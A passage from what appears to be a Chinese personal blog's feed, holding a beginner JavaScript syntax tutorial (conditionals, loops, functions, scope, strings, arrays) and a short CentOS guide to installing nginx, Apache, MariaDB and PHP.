&gt;= <span class="number">80</span> &amp;&amp; count &lt;= <span class="number">90</span>)&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;你的成绩等级为B&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (count &gt;= <span class="number">60</span> &amp;&amp; count &lt;= <span class="number">80</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为C&quot;</span>);      </span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span> (count &gt;= <span class="number">0</span> &amp;&amp; count &lt;= <span class="number">60</span>)&#123;</span><br><span class="line"> <span class="built_in">document</span>.write(<span class="string">&quot;您的成绩等级为不及格！！&quot;</span>)</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="built_in">document</span>.write(<span class="string">&quot;您的输入有误，请重新输入！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>判断语句的嵌套</strong></em></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x=<span class="number">5</span>,y=<span class="number">8</span>;</span><br><span class="line"><span class="keyword">if</span>(x&lt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(y&gt;<span class="number">5</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y&gt;5&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y&lt;5&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(y==<span class="number">10</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y==10&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;y!=10 &amp;&amp; x&gt;5&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><em><strong>switch…case</strong></em><br>根据条件，case 选择执行</li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> value = prompt(<span class="string">&quot;?&quot;</span>)</span><br><span class="line"><span class="keyword">switch</span>(value)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;cat&quot;</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;this is cat&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;dog&quot;</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;this is dog&quot;</span>);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&quot;dashuaibi&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>*** 三元运算符***<blockquote><p>条件表达式?语句1:语句2;<br>满足条件执行语句1，不满足执行语句2</p></blockquote></li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">20</span>;</span><br><span class="line">a &gt; b ? <span class="built_in">document</span>.write(<span class="string">&quot;a大&quot;</span>):<span class="built_in">document</span>.write(<span class="string">&quot;b大&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h2><ul><li><strong>while循环</strong><blockquote><p>while (条件){<br>循环体语句；<br>} </p></blockquote></li></ul><p>先判断条件，如果为真便执行循环体语句，直到条件为假时才结束</p><p>循环，并继续执行循环程序后的语句，恒真假条件：0&lt;1恒为真，0&gt;1恒为假，只有0为假。-1,1为真。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (i&lt;=<span class="number">100</span>)&#123;</span><br><span class="line">sum += i; <span class="comment">//sum=sum+i sum</span></span><br><span class="line">    i++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(sum)</span><br></pre></td></tr></table></figure><ul><li><strong>do…while循环</strong><blockquote><p>do{<br>//循环体语句；<br>}while(测试条件);</p></blockquote></li></ul><p>do while是先执行循环体语句，在进行条件判断，所以为假时也能执行一次循环体语句。<br>而while语句是先判断条件在执行循环体语句。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    sum += i; <span class="comment">//sum=sum+i sum</span></span><br><span class="line">    i++;</span><br><span class="line">&#125;<span class="keyword">while</span>(i&lt;=<span class="number">100</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>for循环</strong><blockquote><p>for(表达式1;表达式2;表达式3)<br>{<br>//被执行的代码块<br>}<br>//后续代码 </p></blockquote></li></ul><ul><li>表达式1：循环开始前执行一次</li><li>表达式2：定义运行循环的条件</li><li>表达式3：再循环已被执行之后执行</li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">document</span>.write(i);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ul><li> **for/in便利数组 **</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">of</span> arr)&#123;</span><br><span class="line">   <span class="built_in">document</span>.write(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line"><span class="keyword">for</span> (i <span class="keyword">in</span> arr)&#123;</span><br><span class="line">   <span class="built_in">document</span>.write(i)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i =<span class="number">0</span>; i&lt;arr.length;i++)&#123;</span><br><span class="line">    <span class="built_in">document</span>.write(arr[i])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p> <strong>break&amp;continue语句</strong></p></li><li><p>break退出直接封闭它的switch、while、do while或者for语句，当多个循环语句彼此嵌套时，break只应用于最里层的语句，直接跳出当前循环。</p></li><li><p>continue开始直接封闭它的switch、while、do while或者for语句的一次新迭代，跳过本次循环，进入下一次循环，多个循环语句嵌套时，continue只应用最里层的语句。</p></li></ul><p><em><strong>break</strong></em></p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line"> &#123;</span><br><span class="line">    <span class="keyword">var</span> x =<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(i == <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">x=x + i +<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="built_in">document</span>.write(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>*** continue***</p><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i==<span class="number">3</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        x= x + i + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        dochument.write(x);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li><p>封装好的一段代码块</p></li><li><p><strong>不带参数的函数</strong></p><blockquote><p>function 函数名()<br>{<br>//函数体;<br>}</p></blockquote></li></ul><p>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> a=<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">var</span> b=<span class="number">20</span>;</span><br><span class="line">    sum = a + b;</span><br><span class="line">    <span class="built_in">document</span>.write(sum);&#125;</span><br><span class="line"> add();</span><br></pre></td></tr></table></figure><ul><li><strong>带参数的函数</strong><blockquote><p>function 函数名（参数1，参数2，……）<br>{<br>//函数体；<br>}</p></blockquote></li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> sum = a+b;  </span><br><span class="line">   <span class="built_in">document</span>.write(sum);</span><br><span class="line">&#125;</span><br><span class="line">add(<span class="number">10</span>,<span class="number">20</span>)</span><br></pre></td></tr></table></figure><ul><li><strong>带返回值的函数</strong></li></ul><blockquote><p>function 函数名（参数1，参数2，……）<br>{<br>//函数体；</p><p>return sum；</p><p>}</p></blockquote><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    sum = num1+ num2;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> value1 = add(<span class="number">10</span>,<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c;</span><br><span class="line">c = value1;</span><br><span class="line"><span class="built_in">document</span>.write(c);</span><br></pre></td></tr></table></figure><ul><li><strong>匿名函数</strong></li></ul><blockquote><p>没有名的函数</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myfunction;</span><br><span class="line">myfunction = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;<span class="keyword">return</span> a*b&#125;;</span><br><span class="line"><span class="keyword">var</span> c = myfunction(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="built_in">document</span>.write(c)</span><br></pre></td></tr></table></figure><ul><li><strong>自调用函数</strong></li></ul><blockquote><p>自己调用自己的函数</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    dochument.write(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">//相当于 add();</span></span><br></pre></td></tr></table></figure><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li><p>局部变量：在函数中通过var声明的变量。</p></li><li><p>全局变量：在函数外通过var声明的变量。</p></li></ul><p>没有声明就使用的变量，默认为全局变量，不论这个变量在哪被使用。</p><ul><li><strong>全局变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> counter = <span class="number">1</span>;<span class="comment">//全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br></pre></td></tr></table></figure><ul><li><strong>局部变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> counter = <span class="number">1</span>;<span class="comment">//局部变量</span></span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br></pre></td></tr></table></figure><ul><li><strong>在函数里面定义全局变量</strong></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    counter = <span class="number">1</span>;<span class="comment">//在函数里面定义全局变量</span></span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">add2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> counter += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(add1());</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>)</span><br><span class="line"><span class="built_in">document</span>.write(add2());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="类-amp-对象"><a href="#类-amp-对象" class="headerlink" title="类&amp;对象"></a>类&amp;对象</h2><ul><li><strong>创建类</strong></li></ul><p>创建一个空白的对象模板，可理解为带参数的对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">person</span>(<span class="params">name,age,job</span>)</span>&#123;    <span class="comment">//创建类</span></span><br><span class="line">    <span class="built_in">this</span>.name= name;         <span class="comment">//类属性</span></span><br><span class="line">    <span class="built_in">this</span>.age=age;</span><br><span class="line">    <span class="built_in">this</span>.job=job;</span><br><span class="line">    <span class="built_in">this</span>.sayname=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="built_in">this</span>.name);</span><br><span class="line">    &#125;;  </span><br><span class="line">&#125;</span><br><span class="line">person1 = <span class="keyword">new</span> person(<span class="string">&quot;gets&quot;</span>,<span class="number">23</span>,<span class="string">&quot;CEO&quot;</span>)  <span class="comment">//实例化类 也就是通过new来创建一个对象</span></span><br><span class="line">person1.sayname();</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><strong>创建一个对象</strong></li></ul><p>定义对象的属性，访问对象的属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> person = &#123;</span><br><span class="line">    <span class="attr">firstName</span>: <span class="string">&quot;John&quot;</span>,</span><br><span class="line">    <span class="attr">lastName</span> : <span class="string">&quot;Doe&quot;</span>,</span><br><span class="line">    <span class="attr">age</span> : <span class="number">50</span>,</span><br><span class="line">    <span class="attr">eyeColor</span>:<span class="string">&quot;blue&quot;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">document</span>.write(person.firstName);<span class="comment">//常用访问对象</span></span><br><span class="line">   <span class="built_in">document</span>.write(person[<span class="string">&quot;firstname&quot;</span>]);</span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>js中一切皆对象！！</p><ul><li><strong>创建字符串的三种方法</strong></li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str1 = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> str2 = <span class="built_in">String</span>(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> str3 = <span class="string">&#x27;icq&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.write(str1+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(str2+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(str3+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>常用字符串的方法</strong></li></ul><p>有对象就有属性和方法</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>toLowerCase、toUpperCase</td><td>转小写、大写</td></tr><tr><td>indexOf</td><td>查找字符串、返回索引值</td></tr><tr><td>substring</td><td>返回被操作字符串的一个子字符串</td></tr><tr><td>substr</td><td>返回被操作字符串的一个子字符串</td></tr><tr><td>split</td><td>将字符串按照指定的分隔符分割成数组</td></tr><tr><td>trim</td><td>清空空格</td></tr><tr><td>match</td><td>查找指定的值，返回匹配的值</td></tr><tr><td>search</td><td>检索字符串首次出现的位置</td></tr><tr><td>replace</td><td>替换指定字符串</td></tr></tbody></table><p>字符串</p><p>replace<br>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="string">&quot;hello world!!&quot;</span></span><br><span class="line"><span class="keyword">var</span> retxt = txt.replace(<span class="string">&quot;world&quot;</span>,<span class="string">&quot;dashuaibi&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(txt);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(retxt);</span><br></pre></td></tr></table></figure><ul><li><strong>常用字符串属性</strong></li></ul><p><strong>length</strong></p><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="string">&quot;ABCDEFGHJKDSDETDSSQWEVBTNVNBBvfvsv&quot;</span></span><br><span class="line"><span class="keyword">var</span> changdu = txt.length;</span><br><span class="line"><span class="built_in">document</span>.write(changdu);</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">Array</span> = [<span class="string">&quot;Audi&quot;</span>,<span class="string">&quot;bmw&quot;</span>,<span class="string">&quot;porsche&quot;</span>,<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;ddd&quot;</span>,<span class="string">&quot;666&quot;</span>]</span><br><span class="line"><span class="built_in">Array</span>[<span class="number">0</span>] = benz;<span class="comment">//修改数组里的值</span></span><br><span class="line"><span class="built_in">Array</span>[<span class="number">2</span>] = toyota;<span class="comment">//修改数组里的值</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="built_in">Array</span>);<span class="comment">//输出数组</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="built_in">Array</span>[<span class="number">1</span>]);<span class="comment">//索引数组里的0号位，即Audi</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos-nginx+apache+mysql+php的安装</title>
      <link href="/posts/22236/"/>
      <url>/posts/22236/</url>
      
        <content type="html"><![CDATA[<h2 id="nginx源码安装"><a href="#nginx源码安装" class="headerlink" title="nginx源码安装"></a>nginx源码安装</h2><h5 id="安装nginx依赖"><a href="#安装nginx依赖" class="headerlink" title="安装nginx依赖"></a>安装nginx依赖</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#yum install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel -y</span><br></pre></td></tr></table></figure><h5 id="配置开启参数及模块，生成makefile文件"><a href="#配置开启参数及模块，生成makefile文件" class="headerlink" title="配置开启参数及模块，生成makefile文件"></a>配置开启参数及模块，生成makefile文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]#./configure --conf-path=/etc/nginx/nginx.conf --sbin-path=/usr/bin/nginx  //这里是加载模块 --add-module=/root/nginx-http-flv-module-master</span><br></pre></td></tr></table></figure><h5 id="生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录："><a href="#生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录：" class="headerlink" title="生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录："></a>生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h5 id="系统服务配置"><a href="#系统服务配置" class="headerlink" title="系统服务配置"></a>系统服务配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#systemctl stop firewalld //关闭防火墙</span><br><span class="line">[root@localhost ~]#systemctl enable nginx //设置nginx开机启动</span><br><span class="line">[root@localhost ~]#systemctl start nginx //启动服务nginx</span><br></pre></td></tr></table></figure><h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#nginx</span><br></pre></td></tr></table></figure><h2 id="安装apache-及相关依赖"><a href="#安装apache-及相关依赖" class="headerlink" title="安装apache 及相关依赖"></a>安装apache 及相关依赖</h2><blockquote><p>httpd就是apache开源的其中一个最有名的项目，即是apache</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#yum install httpd httpd-devel httpd-manual mod_ssl -y //安装httpd及依赖</span><br><span class="line">[root@localhost ~]#systemctl enable httpd  //设置httpd开机启动</span><br><span class="line">[root@localhost ~]#systemctl start httpd   //启动服务httpd</span><br><span class="line">[root@localhost ~]#yum install mariadb-server -y //安装mysql</span><br><span class="line">[root@localhost ~]#systemctl enable mariadb  //设置mariadb开机启动</span><br><span class="line">[root@localhost ~]#systemctl start mariadb   //启动服务mariadb</span><br><span class="line">[root@localhost ~]#mysql_secure_installation    //配置mysql</span><br><span class="line">[root@localhost ~]#yum install  php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml -y        //安装PHP及相关依赖</span><br><span class="line">[root@localhost ~]#systemctl restart httpd    //重新启动httpd</span><br></pre></td></tr></table></figure><blockquote><p>Nginx默认web目录：/usr/local/nginx/html<br>Apache默认web目录：/var/www/html</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux与windows 命令的对比</title>
      <link href="/posts/3757/"/>
      <url>/posts/3757/</url>
